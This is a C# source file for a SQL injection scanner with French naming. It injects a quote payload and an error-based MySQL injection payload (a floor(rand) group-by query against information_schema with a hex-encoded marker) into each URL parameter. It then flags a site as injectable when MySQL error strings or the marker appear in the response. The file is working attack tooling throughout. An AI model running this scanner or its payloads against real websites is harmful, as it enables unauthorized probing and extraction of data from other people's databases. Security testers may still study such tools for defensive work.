using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SQl_SCanner
{
    class sqli_check
    {
        private MainForm form = GlobalVar.form;
        List<string> _param = new List<string>{ };
        private string var_n = "[t]";
        private const string baseI = "(select 1 from(select count(*),concat((select(select [t]) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)";
        private const string baseF = "unhex(hex(concat([t])))";
        private const string testSTR = "QUADCOREEE66615";
        private const string sqli = "'A=0";
        private const string separateur = "!~!";

        public bool demmareAnalyseFast(string url)
        {
            checked
            {
                string url_racine = url.Split('?')[0];
                HttpRequete hr = new HttpRequete();
                chaine ch = new chaine();
                _param = ch.analyseParam(url);
                for (int i = 0; i < _param.Count; i++)
                {
                    string url_c = url_racine + ch.genParamParIndex(_param, 0, i + 1) + sqli + ch.genParamParIndex(_param, i + 1, _param.Count);
                    string page = hr.get(url_c);
                    if (verifPage(page))
                    {
                        return true;
                    }
                }
                return false; 
            }
        }
        public bool demmareAnalyseAvanced(string url)
        {
            checked
            {
                string url_racine = url.Split('?')[0];
                HttpRequete hr = new HttpRequete();
                chaine ch = new chaine();
                _param = ch.analyseParam(url);

                string param_curr = baseI.Replace(var_n, baseF.Replace(var_n, ch.getHex(separateur) + "," + ch.getHex(testSTR) + "," + ch.getHex(separateur)));

                for (int i = 0; i < _param.Count; i++)
                {
                    string url_c = url_racine + ch.ViderDernierParam(ch.genParamParIndex(_param, 0, i + 1)) + ch.Encode(param_curr) + ch.genParamParIndex(_param, i + 1, _param.Count);
                    string page = hr.get(url_c);
                    if (verifPageAdvenced(page))
                    {
                        return true;
                    }
                }
                return false; 
            }
        }

        private bool verifPage(string page)
        {
            if (page.Contains("You have an error in your SQL syntax") 
                || page.Contains("mysql_num_rows()")
                || page.Contains("mysql_fetch_array()")
                || page.Contains("mysql_fetch_object()")
                || page.Contains("mysql_fetch_assoc()")
                || page.Contains("mysql_fetch_row()")
                || page.Contains("SELECT * FROM")
                || page.Contains("mysql_")
                || page.Contains("supplied argument is not a valid MySQL"))
            {
                return true;
            }
            else
            {
                return false;
            }
        }
        private bool verifPageAdvenced(string page)
        {
            if (page.Contains(testSTR))
            {
                return true;
            }
            else
            {
                return false;
            }
        }
    }
}
